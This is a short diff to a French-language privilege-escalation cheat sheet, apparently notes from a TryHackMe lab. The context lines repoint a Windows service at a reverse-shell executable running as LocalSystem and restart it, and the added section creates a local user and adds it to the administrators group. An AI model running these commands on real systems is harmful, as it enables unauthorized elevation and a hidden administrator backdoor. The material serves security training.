@@ -274,4 +274,11 @@ sc config MyService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
 sc stop MyService
 sc start MyService
 ```
+
+### Si compte avec privilège
+
+```
+net user <username> <password> /add
+net localgroup administrators <username> /add
+```
 Crédit: TryHackMe
